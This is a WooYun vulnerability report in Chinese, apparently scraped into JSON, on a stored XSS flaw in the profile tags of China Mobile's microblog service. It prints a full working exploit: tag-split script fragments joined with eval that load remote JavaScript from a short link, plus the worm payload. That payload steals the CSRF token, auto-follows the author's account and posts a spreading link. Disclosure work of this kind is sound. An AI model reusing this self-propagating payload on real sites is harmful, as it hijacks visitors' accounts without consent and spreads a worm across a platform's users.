{"id": 61950, "wybug_id": "wooyun-2013-037390", "wybug_title": "移动微博某处存储型XSS漏洞（可蠕虫）", "wybug_corp": "139移动互联", "wybug_author": "索马里的海贼", "wybug_date": "2013-09-17 17:08", "wybug_open_date": "2013-09-22 17:09", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-09-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-09-22：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 移动微博某处XSS可导致蠕虫传播 详细说明：  移动微博个人资料中的“个人标签”项在个人展示页面输出时未作过滤 导致XSS由此XSS可导致蠕虫传播\n\n由于每个标签限定16个中文字符(32个英文)，所以将payload拆开写其实还有些小细节 比如只能插10个标签地方不够用、用jquery吧 jquery在这个xss点的后面才开始加载  js刚入门 鼓捣半天才出来的可用exp\n<script>var y='$.getSc'</script><script>y%2b='ript(\\'htt'</script><script>y%2b='p://t.cn/z'</script><script>y%2b='8HQb0w\\')'</script><script>var x='functio'</script><script>x%2b='n a(){eval'</script><script>eval(x%2b'(y)}')</script><img src=# onerror='a()'>\n将这些作为标签写入页面引入了一个外部js 内容为\nvar myid=\"250248919\";var followurl=\"/ajax/json/followop/addfollow/friendIdList=\"+myid;var pushurl=\"/ajax/json/pushfeed/pushfeed\";var crumb=$.crumb.get();var text=\"text=%E8%BF%99%E4%B9%9F%E8%A1%8C%E5%95%8Ahttp%3A%2F%2Ft.cn%2Fz8H1QrX\";$.post(pushurl,\"text=\"+text+\"&from=home_top&list_id=&crumb=\"+crumb,function(data){});$.post(followurl,\"crumb=\"+crumb,function(data){});\n获取crumb(token)并加关注 发微薄，其实有了xss干啥不行是吧。。。写入完成后 任何人只要访问你的主页 就会自动关注并且发布一个带有你主页链接的微博 引起蠕虫效应   漏洞证明：  访问http://weibo.10086.cn/suomalihaizei自动加关注+发微博\n\n   修复方案：  修XSS吧   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-09-22 17:09 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-09-27 17:21 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:111 漏洞数:34        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n  这洞尼玛挺不错的呀，为神马给忽略了，无视白帽子，你丫的    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}